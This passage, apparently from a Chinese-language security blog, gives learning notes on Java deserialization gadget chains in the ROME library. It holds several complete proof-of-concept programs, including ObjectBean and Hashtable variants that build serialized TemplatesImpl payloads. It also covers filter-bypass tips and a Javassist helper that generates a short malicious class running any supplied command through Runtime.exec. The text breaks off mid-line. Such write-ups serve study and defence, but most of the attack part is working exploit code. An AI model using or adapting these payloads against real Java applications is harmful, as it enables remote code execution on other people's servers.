title="ObjectBean"></a>ObjectBean</h3><p><code>ObjectBean</code>的hashCode方法直接调用了<code>_equalsBean.hashCode</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> _equalsBean.beanHashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下它的构造函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectBean</span><span class="params">(Class beanClass,Object obj,Set ignoreProperties)</span> &#123;</span><br><span class="line">    _equalsBean = <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(beanClass,obj);</span><br><span class="line">    _toStringBean = <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(beanClass,obj);</span><br><span class="line">    _cloneableBean = <span class="keyword">new</span> <span class="title class_">CloneableBean</span>(obj,ignoreProperties);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接创建了一个<code>EqualsBean</code>, 那么这个类就可以替换掉刚刚手动创建的的<code>EqualsBean</code></p><p>链子如下:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820202630402.png" alt="image-20240820202630402"></p><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RomeUnserial2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] evilCodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\ROMEUnseria\\target\\test-classes\\evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] evil = &#123;evilCodes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//  EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, evil);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(hashMap);</span><br><span class="line">        string2file(poc, <span class="string">&quot;poc2.txt&quot;</span>);</span><br><span class="line">        InspectB64Poc(<span class="string">&quot;poc2.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="HashTable"><a href="#HashTable" class="headerlink" title="HashTable"></a>HashTable</h3><p>针对<code>HashMap</code>的过滤可以使用<code>HashTable</code>来绕过</p><p>在<code>HashTabl</code>e的<code>readObject</code>方法中对每一个<code>key</code>都进行了<code>reconstitutionPut</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820203751670.png" alt="image-20240820203751670"></p><p>跟进发现调用了<code>key.hashCode()</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820203823164.png" alt="image-20240820203823164"></p><p>直接把Hashmap改成HashTable即可</p><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RomeUnserial3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] evilCodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\ROMEUnseria\\target\\test-classes\\evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] evil = &#123;evilCodes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//  EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(objectBean, <span class="string">&quot;111&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, evil);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(hashtable);</span><br><span class="line">        string2file(poc, <span class="string">&quot;poc3.txt&quot;</span>);</span><br><span class="line">        InspectB64Poc(<span class="string">&quot;poc3.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="配合CC链"><a href="#配合CC链" class="headerlink" title="配合CC链"></a>配合CC链</h3><p>当然也可以使用CC中的任意方法调用来调用toString方法</p><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>JdbcRowSetImpl在FastJson中在&lt;&#x3D;1.2.24时使用的一个链子，这是针对后半段动态类加载不出网换成出网</p><h3 id="HotSwappableTargetSource"><a href="#HotSwappableTargetSource" class="headerlink" title="HotSwappableTargetSource"></a>HotSwappableTargetSource</h3><p>spring原生的toString利用链</p><p>需要添加spring依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.19.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="缩短Payload"><a href="#缩短Payload" class="headerlink" title="缩短Payload"></a>缩短Payload</h2><p>当payload长度被限制时, 即使最短的链条也无法成功执行, 因此需要进一步缩短</p><h3 id="使用Javassist缩短恶意class"><a href="#使用Javassist缩短恶意class" class="headerlink" title="使用Javassist缩短恶意class"></a>使用Javassist缩短恶意class</h3><blockquote><h4 id="Javassist："><a href="#Javassist：" class="headerlink" title="Javassist："></a>Javassist：</h4><p>Java 字节码以二进制的形式存储在 .class 文件中，每一个.class文件包含一个Java类或接口。Javaassist 就是一个用来处理Java字节码的类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解。同时也可以通过手动的方式去生成一个新的类对象。其使用方式类似于反射。</p></blockquote><blockquote><h4 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h4><p>可以将其理解成加强版的Class对象，我们可以通过CtClass对目标类进行各种操作。可以<code>ClassPool.get(ClassName)</code>中获取。</p></blockquote><blockquote><h4 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h4><p><code>ClassPool</code>是<code>CtClass</code>对象的容器。<code>CtClass</code>对象必须从该对象获得。如果<code>get()</code>在此对象上调用，则它将搜索表示的各种源<code>ClassPath</code> 以查找类文件，然后创建一个<code>CtClass</code>表示该类文件的对象。创建的对象将返回给调用者。可以将其理解为一个存放<code>CtClass</code>对象的容器。</p><p>获得方法： <code>ClassPool cp = ClassPool.getDefault();</code>。通过 <code>ClassPool.getDefault()</code> 获取的 <code>ClassPool</code> 使用 JVM 的类搜索路径。<strong>如果程序运行在 JBoss 或者 Tomcat 等 Web 服务器上，ClassPool 可能无法找到用户的类</strong>，因为Web服务器使用多个类加载器作为系统类加载器。在这种情况下，<strong>ClassPool 必须添加额外的类搜索路径</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(&lt;Class&gt;));</span><br></pre></td></tr></table></figure></blockquote><blockquote><h4 id="CtMethod"><a href="#CtMethod" class="headerlink" title="CtMethod"></a>CtMethod</h4><p>同理，可以理解成加强版的<code>Method</code>对象。可通过<code>CtClass.getDeclaredMethod(MethodName)</code>获取，该类提供了一些方法以便我们能够直接修改方法体</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">CtMethod</span> <span class="keyword">extends</span> <span class="title class_">CtBehavior</span> &#123;</span><br><span class="line">    <span class="comment">// 主要的内容都在父类 CtBehavior 中</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 父类 CtBehavior</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">CtBehavior</span> <span class="keyword">extends</span> <span class="title class_">CtMember</span> &#123;</span><br><span class="line">    <span class="comment">// 设置方法体</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBody</span><span class="params">(String src)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入在方法体最前面</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertBefore</span><span class="params">(String src)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入在方法体最后面</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertAfter</span><span class="params">(String src)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在方法体的某一行插入内容</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">insertAt</span><span class="params">(<span class="type">int</span> lineNum, String src)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>feng师傅还介绍了几种对应的语言扩展：</p><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td>$0,$1, $2, …</td><td>$0 &#x3D; this; $1 &#x3D; args[1] …..</td></tr><tr><td>$args</td><td>方法参数数组.它的类型为 Object[]</td></tr><tr><td>$$</td><td>所有实参。例如, m($$) 等价于 m(1,2,…)</td></tr><tr><td>$cflow(…)</td><td>cflow 变量</td></tr><tr><td>$r</td><td>返回结果的类型，用于强制类型转换</td></tr><tr><td>$w</td><td>包装器类型，用于强制类型转换</td></tr><tr><td>$_</td><td>返回值</td></tr><tr><td>$sig</td><td>类型为 java.lang.Class 的参数类型数组</td></tr><tr><td>$type</td><td>一个 java.lang.Class 对象，表示返回值类型</td></tr><tr><td>$class</td><td>一个 java.lang.Class 对象，表示当前正在修改的类</td></tr></tbody></table><p>关于<code>TemplatesImpl</code>这个类, 实际上不只是加载了字节码, 最终还对加载的类进行了实例化, 如图</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240821123921875.png" alt="image-20240821123921875"></p><p>因此可以把恶意代码放在构造器中</p><p>这样就可以简单生成一个恶意类, 这种直接生成字节码的方式跳过了编译阶段, 因此也不需要重写父类的方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetShellCode</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> CtClass <span class="title function_">getTemplatesImpl</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            ctClass = pool.makeClass(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public A()&#123;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;);\n&#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addConstructor(constructor);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> ctClass;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (CannotCompileException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">WriteEvilClass</span><span class="params">()</span> <span class="keyword">throws</span> CannotCompileException, IOException &#123;</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">shell</span> <span class="operator">=</span> GetShellCode.getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        shell.writeFile(<span class="string">&quot;D:\\Code\\Java-code\\ROMEUnseria\\target\\test-classes\\JavaassitShellCode&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CannotCompileException, IOException &#123;</span><br><span class="line">        WriteEvilClass();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对比一下大小:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240821125141207.png" alt="image-20240821125141207"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240821125203492.png" alt="image-20240821125203492"></p><p>明显缩小了很多</p><p>直接把这个方法封装起来使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShellCode</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">getEvilTemplatesImpl</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[][] evilbytes = &#123;getEvilClassCode(cmd, <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>)&#125;;</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, evilbytes);</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClassCode(String cmd, String superclass) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(superclass);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public A()&#123;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;);\n&#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addConstructor(constructor);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception  e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样写exp也简化了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RomeUnserial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> getEvilTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span 